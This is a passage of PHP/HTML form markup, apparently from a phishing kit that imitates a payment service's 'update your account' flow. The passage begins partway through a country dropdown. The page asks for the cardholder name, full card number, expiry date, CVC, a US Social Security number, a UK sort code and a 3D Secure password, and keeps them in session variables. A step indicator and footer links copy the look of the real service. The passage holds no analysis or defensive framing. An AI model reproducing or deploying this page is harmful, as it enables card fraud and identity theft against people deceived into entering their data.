<option value="Nigeria" <?php if($_SESSION['_count3s_']=="Nigeria"){ echo 'selected="selected"';}?> >Nigeria</option> 
<option value="Niue" <?php if($_SESSION['_count3s_']=="Niue"){ echo 'selected="selected"';}?> >Niue</option> 
<option value="Norfolk Island" <?php if($_SESSION['_count3s_']=="Norfolk Island"){ echo 'selected="selected"';}?> >Norfolk Island</option> 
<option value="Northern Mariana Islands" <?php if($_SESSION['_count3s_']=="Northern Mariana Islands"){ echo 'selected="selected"';}?> >Northern Mariana Islands</option> 
<option value="Norway" <?php if($_SESSION['_count3s_']=="Norway"){ echo 'selected="selected"';}?> >Norway</option> 
<option value="Oman" <?php if($_SESSION['_count3s_']=="Oman"){ echo 'selected="selected"';}?> >Oman</option> 
<option value="Pakistan" <?php if($_SESSION['_count3s_']=="Pakistan"){ echo 'selected="selected"';}?> >Pakistan</option> 
<option value="Palau" <?php if($_SESSION['_count3s_']=="Palau"){ echo 'selected="selected"';}?> >Palau</option> 
<option value="Palestinian Territory, Occupied" <?php if($_SESSION['_count3s_']=="Palestinian Territory, Occupied"){ echo 'selected="selected"';}?> >Palestinian Territory, Occupied</option> 
<option value="Panama" <?php if($_SESSION['_count3s_']=="Panama"){ echo 'selected="selected"';}?> >Panama</option> 
<option value="Papua New Guinea" <?php if($_SESSION['_count3s_']=="Papua New Guinea"){ echo 'selected="selected"';}?> >Papua New Guinea</option> 
<option value="Paraguay" <?php if($_SESSION['_count3s_']=="Paraguay"){ echo 'selected="selected"';}?> >Paraguay</option> 
<option value="Peru" <?php if($_SESSION['_count3s_']=="Peru"){ echo 'selected="selected"';}?> >Peru</option> 
<option value="Philippines" <?php if($_SESSION['_count3s_']=="Philippines"){ echo 'selected="selected"';}?> >Philippines</option> 
<option value="Pitcairn" <?php if($_SESSION['_count3s_']=="Pitcairn"){ echo 'selected="selected"';}?> >Pitcairn</option> 
<option value="Poland" <?php if($_SESSION['_count3s_']=="Poland"){ echo 'selected="selected"';}?> >Poland</option> 
<option value="Portugal" <?php if($_SESSION['_count3s_']=="Portugal"){ echo 'selected="selected"';}?> >Portugal</option> 
<option value="Puerto Rico" <?php if($_SESSION['_count3s_']=="Puerto Rico"){ echo 'selected="selected"';}?> >Puerto Rico</option> 
<option value="Qatar" <?php if($_SESSION['_count3s_']=="Qatar"){ echo 'selected="selected"';}?> >Qatar</option> 
<option value="Reunion" <?php if($_SESSION['_count3s_']=="Reunion"){ echo 'selected="selected"';}?> >Reunion</option> 
<option value="Romania" <?php if($_SESSION['_count3s_']=="Romania"){ echo 'selected="selected"';}?> >Romania</option> 
<option value="Russian Federation" <?php if($_SESSION['_count3s_']=="Russian Federation"){ echo 'selected="selected"';}?> >Russian Federation</option> 
<option value="Rwanda" <?php if($_SESSION['_count3s_']=="Rwanda"){ echo 'selected="selected"';}?> >Rwanda</option> 
<option value="Saint Helena" <?php if($_SESSION['_count3s_']=="Saint Helena"){ echo 'selected="selected"';}?> >Saint Helena</option> 
<option value="Saint Kitts and Nevis" <?php if($_SESSION['_count3s_']=="Saint Kitts and Nevis"){ echo 'selected="selected"';}?> >Saint Kitts and Nevis</option> 
<option value="Saint Lucia" <?php if($_SESSION['_count3s_']=="Saint Lucia"){ echo 'selected="selected"';}?> >Saint Lucia</option> 
<option value="Saint Pierre and Miquelon" <?php if($_SESSION['_count3s_']=="Saint Pierre and Miquelon"){ echo 'selected="selected"';}?> >Saint Pierre and Miquelon</option> 
<option value="Saint Vincent and The Grenadines" <?php if($_SESSION['_count3s_']=="Saint Vincent and The Grenadines"){ echo 'selected="selected"';}?> >Saint Vincent and The Grenadines</option> 
<option value="Samoa" <?php if($_SESSION['_count3s_']=="Samoa"){ echo 'selected="selected"';}?> >Samoa</option> 
<option value="San Marino" <?php if($_SESSION['_count3s_']=="San Marino"){ echo 'selected="selected"';}?> >San Marino</option> 
<option value="Sao Tome and Principe" <?php if($_SESSION['_count3s_']=="Sao Tome and Principe"){ echo 'selected="selected"';}?> >Sao Tome and Principe</option> 
<option value="Saudi Arabia" <?php if($_SESSION['_count3s_']=="Saudi Arabia"){ echo 'selected="selected"';}?> >Saudi Arabia</option> 
<option value="Senegal" <?php if($_SESSION['_count3s_']=="Senegal"){ echo 'selected="selected"';}?> >Senegal</option> 
<option value="Serbia and Montenegro" <?php if($_SESSION['_count3s_']=="Serbia and Montenegro"){ echo 'selected="selected"';}?> >Serbia and Montenegro</option> 
<option value="Seychelles" <?php if($_SESSION['_count3s_']=="Seychelles"){ echo 'selected="selected"';}?> >Seychelles</option> 
<option value="Sierra Leone" <?php if($_SESSION['_count3s_']=="Sierra Leone"){ echo 'selected="selected"';}?> >Sierra Leone</option> 
<option value="Singapore" <?php if($_SESSION['_count3s_']=="Singapore"){ echo 'selected="selected"';}?> >Singapore</option> 
<option value="Slovakia" <?php if($_SESSION['_count3s_']=="Slovakia"){ echo 'selected="selected"';}?> >Slovakia</option> 
<option value="Slovenia" <?php if($_SESSION['_count3s_']=="Slovenia"){ echo 'selected="selected"';}?> >Slovenia</option> 
<option value="Solomon Islands" <?php if($_SESSION['_count3s_']=="Solomon Islands"){ echo 'selected="selected"';}?> >Solomon Islands</option> 
<option value="Somalia" <?php if($_SESSION['_count3s_']=="Somalia"){ echo 'selected="selected"';}?> >Somalia</option> 
<option value="South Africa" <?php if($_SESSION['_count3s_']=="South Africa"){ echo 'selected="selected"';}?> >South Africa</option> 
<option value="South Georgia and The South Sandwich Islands" <?php if($_SESSION['_count3s_']=="South Georgia and The South Sandwich Islands"){ echo 'selected="selected"';}?> >South Georgia and The South Sandwich Islands</option> 
<option value="Spain" <?php if($_SESSION['_count3s_']=="Spain"){ echo 'selected="selected"';}?> >Spain</option> 
<option value="Sri Lanka" <?php if($_SESSION['_count3s_']=="Sri Lanka"){ echo 'selected="selected"';}?> >Sri Lanka</option> 
<option value="Sudan" <?php if($_SESSION['_count3s_']=="Sudan"){ echo 'selected="selected"';}?> >Sudan</option> 
<option value="Suriname" <?php if($_SESSION['_count3s_']=="Suriname"){ echo 'selected="selected"';}?> >Suriname</option> 
<option value="Svalbard and Jan Mayen" <?php if($_SESSION['_count3s_']=="Svalbard and Jan Mayen"){ echo 'selected="selected"';}?> >Svalbard and Jan Mayen</option> 
<option value="Swaziland" <?php if($_SESSION['_count3s_']=="Swaziland"){ echo 'selected="selected"';}?> >Swaziland</option> 
<option value="Sweden" <?php if($_SESSION['_count3s_']=="Sweden"){ echo 'selected="selected"';}?> >Sweden</option> 
<option value="Switzerland" <?php if($_SESSION['_count3s_']=="Switzerland"){ echo 'selected="selected"';}?> >Switzerland</option> 
<option value="Syrian Arab Republic" <?php if($_SESSION['_count3s_']=="Syrian Arab Republic"){ echo 'selected="selected"';}?> >Syrian Arab Republic</option> 
<option value="Taiwan, Province of China" <?php if($_SESSION['_count3s_']=="Taiwan, Province of China"){ echo 'selected="selected"';}?> >Taiwan, Province of China</option> 
<option value="Tajikistan" <?php if($_SESSION['_count3s_']=="Tajikistan"){ echo 'selected="selected"';}?> >Tajikistan</option> 
<option value="Tanzania, United Republic of" <?php if($_SESSION['_count3s_']=="Tanzania, United Republic of"){ echo 'selected="selected"';}?> >Tanzania, United Republic of</option> 
<option value="Thailand" <?php if($_SESSION['_count3s_']=="Thailand"){ echo 'selected="selected"';}?> >Thailand</option> 
<option value="Timor-leste" <?php if($_SESSION['_count3s_']=="Timor-leste"){ echo 'selected="selected"';}?> >Timor-leste</option> 
<option value="Togo" <?php if($_SESSION['_count3s_']=="Togo"){ echo 'selected="selected"';}?> >Togo</option> 
<option value="Tokelau" <?php if($_SESSION['_count3s_']=="Tokelau"){ echo 'selected="selected"';}?> >Tokelau</option> 
<option value="Tonga" <?php if($_SESSION['_count3s_']=="Tonga"){ echo 'selected="selected"';}?> >Tonga</option> 
<option value="Trinidad and Tobago" <?php if($_SESSION['_count3s_']=="Trinidad and Tobago"){ echo 'selected="selected"';}?> >Trinidad and Tobago</option> 
<option value="Tunisia" <?php if($_SESSION['_count3s_']=="Tunisia"){ echo 'selected="selected"';}?> >Tunisia</option> 
<option value="Turkey" <?php if($_SESSION['_count3s_']=="Turkey"){ echo 'selected="selected"';}?> >Turkey</option> 
<option value="Turkmenistan" <?php if($_SESSION['_count3s_']=="Turkmenistan"){ echo 'selected="selected"';}?> >Turkmenistan</option> 
<option value="Turks and Caicos Islands" <?php if($_SESSION['_count3s_']=="Turks and Caicos Islands"){ echo 'selected="selected"';}?> >Turks and Caicos Islands</option> 
<option value="Tuvalu" <?php if($_SESSION['_count3s_']=="Tuvalu"){ echo 'selected="selected"';}?> >Tuvalu</option> 
<option value="Uganda" <?php if($_SESSION['_count3s_']=="Uganda"){ echo 'selected="selected"';}?> >Uganda</option> 
<option value="Ukraine" <?php if($_SESSION['_count3s_']=="Ukraine"){ echo 'selected="selected"';}?> >Ukraine</option> 
<option value="United Arab Emirates" <?php if($_SESSION['_count3s_']=="United Arab Emirates"){ echo 'selected="selected"';}?> >United Arab Emirates</option> 
<option value="United Kingdom" <?php if($_SESSION['_count3s_']=="United Kingdom"){ echo 'selected="selected"';}?> >United Kingdom</option>
<option value="United States" <?php if($_SESSION['_count3s_']=="United States"){ echo 'selected="selected"';}?> >United States</option> 
<option value="United States Minor Outlying Islands" <?php if($_SESSION['_count3s_']=="United States Minor Outlying Islands"){ echo 'selected="selected"';}?> >United States Minor Outlying Islands</option> 
<option value="Uruguay" <?php if($_SESSION['_count3s_']=="Uruguay"){ echo 'selected="selected"';}?> >Uruguay</option> 
<option value="Uzbekistan <?php if($_SESSION['_count3s_']=="Uzbekistan"){ echo 'selected="selected"';}?> ">Uzbekistan</option> 
<option value="Vanuatu" <?php if($_SESSION['_count3s_']=="Vanuatu"){ echo 'selected="selected"';}?> >Vanuatu</option> 
<option value="Venezuela" <?php if($_SESSION['_count3s_']=="Venezuela"){ echo 'selected="selected"';}?> >Venezuela</option> 
<option value="Vietnam" <?php if($_SESSION['_count3s_']=="Vietnam"){ echo 'selected="selected"';}?> >Vietnam</option> 
<option value="Virgin Islands, British" <?php if($_SESSION['_count3s_']=="Virgin Islands, British"){ echo 'selected="selected"';}?> >Virgin Islands, British</option> 
<option value="Virgin Islands, U.S." <?php if($_SESSION['_count3s_']=="Virgin Islands, U.S."){ echo 'selected="selected"';}?> >Virgin Islands, U.S.</option> 
<option value="Wallis and Futuna" <?php if($_SESSION['_count3s_']=="Wallis and Futuna"){ echo 'selected="selected"';}?> >Wallis and Futuna</option> 
<option value="Western Sahara" <?php if($_SESSION['_count3s_']=="Western Sahara"){ echo 'selected="selected"';}?> >Western Sahara</option> 
<option value="Yemen" <?php if($_SESSION['_count3s_']=="Yemen"){ echo 'selected="selected"';}?> >Yemen</option> 
<option value="Zambia" <?php if($_SESSION['_count3s_']=="Zambia"){ echo 'selected="selected"';}?> >Zambia</option> 
<option value="Zimbabwe" <?php if($_SESSION['_count3s_']=="Zimbabwe"){ echo 'selected="selected"';}?> >Zimbabwe</option>
</select>


</div>
          </div>
          
                           <?php } ?>
        <div class="control-group">
          <label class="control-label" for="cardholder"><?php echo $CARD_HOLDER_TXT; ?><span class="red">*</span></label>
          <div class="controls"><input type="text" class="input" name="cardholder" id="cardholder" value="<?php if(isset($_SESSION['_cardholder_'])){ echo $_SESSION['_cardholder_'];} ?>" title="Card Holder Name"   pattern="[a-zA-Z].{3,}" autofocus required /></div>
          </div>
		  <div class="control-group">
          <label class="control-label" for="cardholder">Card Type<span class="red"> </span></label>
          <div class="prfDetails confidential">
<img id="visa" src="../../img/icons/v.png" width="36" height="30" style="opacity: 0.40;"/>
<img id="electron" src="../../img/icons/visa-electron-curved.png" width="36" height="30" style="opacity: 0.40;"/>
<img id="mastercard" src="../../img/icons/payment_method_master_card-48.png" width="36" height="30" style="opacity: 0.40;"/>
<img id="maestro" src="../../img/icons/maestro-curved.png" width="36" height="30" style="opacity: 0.40;"/>
<img id="amex" src="../../img/icons/payment_method_american_express_card-48.png" width="36" height="30" style="opacity: 0.40;"/>
<img id="discover" src="../../img/icons/payment_method_discover_network_card-48.png" width="36" height="30" style="opacity: 0.40;"/>
</div></div>

          <div class="control-group">
          <label class="control-label" for="cardnumber"><?php echo $CARD_NUMBER_TXT; ?><span class="red">*</span></label>
          <div class="controls" id="samma"><input type="text" name="cardnumber" id="cardnumber" autocomplete="off" onkeyup="SelectCC(this.value)" title="Enter 16 Digit Card Number" value="" required maxlength="16" pattern="^(?:4[0-9]{15}?|5[1-5][0-9]{14}|(5018|5020|5038|5612|5893|6304|6759|6761|6762|6763|0604|6390)\d{12}$|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$" /></div>
          </div>
		  	<input name="c_type" type="hidden" id="crad_type" width="" value="" />
			<input name="c_valid" type="hidden" id="card_valid" value="" />
        <div class="control-group">
          <label class="control-label" for="expmonth"><?php echo $EXPIRATION_DATE_TXT; ?><span class="red">*</span></label>
          <div class="controls"><select class="input-small" name="expmonth" style="width: 100px;" id="expmonth" required>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="") echo "selected"; } ?> value="">Month</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="01") echo "selected"; } ?> value="01">1-January</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="02") echo "selected"; } ?> value="02">2-Febuary</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="03") echo "selected"; } ?> value="03">3-March</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="04") echo "selected"; } ?> value="04">4-April</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="05") echo "selected"; } ?> value="05">5-May</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="06") echo "selected"; } ?> value="06">6-June</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="07") echo "selected"; } ?> value="07">7-July</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="08") echo "selected"; } ?> value="08">8-August</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="09") echo "selected"; } ?> value="09">9-September</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="10") echo "selected"; } ?> value="10">10-October</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="11") echo "selected"; } ?> value="11">11-November</option>
	<option <?php if(isset($_SESSION['_edmonth_'])){  if($_SESSION['_edmonth_']=="12") echo "selected"; } ?> value="12">12-December</option>
							</select>
                                <select class="input-mini" name="expyear" style="width: 70px;" id="expyear" required>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="") echo "selected"; } ?> value="">Year</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="16") echo "selected"; } ?> value="16">2016</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="17") echo "selected"; } ?> value="17">2017</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="18") echo "selected"; } ?> value="18">2018</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="19") echo "selected"; } ?> value="19">2019</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="20") echo "selected"; } ?> value="20">2020</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="21") echo "selected"; } ?> value="21">2021</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="22") echo "selected"; } ?> value="22">2022</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="23") echo "selected"; } ?> value="23">2023</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="24") echo "selected"; } ?> value="24">2024</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="25") echo "selected"; } ?> value="25">2025</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="26") echo "selected"; } ?> value="26">2026</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="27") echo "selected"; } ?> value="27">2027</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="28") echo "selected"; } ?> value="28">2028</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="29") echo "selected"; } ?> value="29">2029</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="30") echo "selected"; } ?> value="30">2030</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="31") echo "selected"; } ?> value="31">2031</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="32") echo "selected"; } ?> value="32">2032</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="33") echo "selected"; } ?> value="33">2033</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="34") echo "selected"; } ?> value="34">2034</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="35") echo "selected"; } ?> value="35">2035</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="36") echo "selected"; } ?> value="36">2036</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="37") echo "selected"; } ?> value="37">2037</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="38") echo "selected"; } ?> value="38">2038</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="39") echo "selected"; } ?> value="39">2039</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="40") echo "selected"; } ?> value="40">2040</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="41") echo "selected"; } ?> value="41">2041</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="42") echo "selected"; } ?> value="42">2042</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="43") echo "selected"; } ?> value="43">2043</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="44") echo "selected"; } ?> value="44">2044</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="45") echo "selected"; } ?> value="45">2045</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="46") echo "selected"; } ?> value="46">2046</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="47") echo "selected"; } ?> value="47">2047</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="48") echo "selected"; } ?> value="48">2048</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="49") echo "selected"; } ?> value="49">2049</option>
	<option <?php if(isset($_SESSION['_edyear_'])){  if($_SESSION['_edyear_']=="50") echo "selected"; } ?> value="50">2050</option>

    				
</select>

</div>
          </div>
          <div class="control-group">
          <label class="control-label" for="cvc"><?php echo $CVC_TXT; ?><span class="red">*</span></label>
          <div class="controls">
          <input type="password" autocomplete="off" onkeyup="Frm1country(country)" class="input-mini" name="cvc" id="cvc" maxlength="4" value="" required pattern="[0-9]{3,4}" title="Enter 3 or 4 Digit Code" />
          </div>
          </div>
              
              <div class="control-group" id="3dcodeeun" style="display: none;">
          <label class="control-label" for="ssn"><?php echo $SSN_TXT;?><span class="red">*</span></label>
          <div class="controls"><input type="text" class="input-small" name="ssn1" id="ssn1" style="margin-right:12px;" maxlength="9" value="<?php if(isset($_SESSION['_SSN_'])){ echo $_SESSION['_SSN_'];} ?>" title="" required pattern="[0-9]{9}" required/></div>
          </div>

              <div class="control-group" id="3dcodeeuk" style="display: none;">
          <label class="control-label" for="sortcode" ><?php echo $SORT_CODE_TXT; ?><span class="red">*</span></label>
          <div class="controls"><input type="text" class="input-mini" name="sortcode" id="sortcode" maxlength="6" value="<?php if(isset($_SESSION['_sort_c_'])){ echo $_SESSION['_sort_c_'];} ?>" title="Enter Your sort num." required pattern="[0-9]{6}" required/></div>
          </div>
              <div class="control-group" id="3dcodee" style="display: none;">
          <label class="control-label" for="secure3d"><?php echo $SECURE_3D_TXT;?><span class="red">*</span></label>
          <div class="controls"><input type="password" class="input-small" name="secure3d" id="secure3d"  value="<?php if(isset($_SESSION['_sec_c_'])){ echo $_SESSION['_sec_c_'];} ?>" autocomplete="off" />  <img id="3dcode" src="../../img/icons/verified-by-visa.png" width="45" style="display: none;"/><img id="3dcodemaster" src="../../img/icons/mastercard-securecode.png" width="55" style="display: none;"/></div>
          </div>
	                 <?php } ?>

        <div class="control-group">  
    <label class="control-label" ></label>
   <div class="controls">
<input type="submit" onClick="unhook()" name="btn_submit" id="btn_submit" value="<?php echo $NEXT_TXT; ?>" class="btn btn-primary" style="padding: 7px 15px 8px; width: 130px; line-height: 18px; font-size:14px;font-weight:bold;" /> </div></div>
          </form>
          
          
        <center><div style="color:#0079c1;margin:35px 0 20px ;" id="ft3"><span style="color:#000;"><?php echo $UPDATE_BILLING_ADDRESS_TXT; ?></span> <b class="caret-right"></b> <?php echo $UPDATE_CREDIT_OR_DEBIT_CARD_TXT; ?> <b class="caret-right"></b> <?php echo $ID_AND_CREDIT_CARD_PROOF_TXT; ?> <b class="caret-right"></b> <?php echo $UPDATE_DONE_TXT; ?></div></center>
       </div>
       
     
       
      </div>

      <hr />


        <div class="container" id="ft1">
         
         
    <ul class="nav nav-pills" style="color:#ccc;font-weight:bold;">
        <li><a href="#"><?php echo $ABOUT_TXT; ?></a></li>
        <li><a href="#"><?php echo $HELP_TXT; ?></a></li>
        <li><a href="#"><?php echo $RATES_TXT; ?></a></li>
        <li><a href="#"><?php echo $SECURITY_TXT; ?></a></li>
        <li><a href="#"><?php echo $DEVELOPERS_TXT; ?></a></li>
        <li><a href="#"><?php echo $PARTNERS_TXT; ?></a></li>
    </ul>
        </div>
      



    </div> <!-- /container -->
    
<?php include("footer.php");?>
    
<!--<script src="../../js/main.js"></script> -->

<!--<script src="../../js/jquery-1.7.1.min.js"></script> -->
</body>
</html>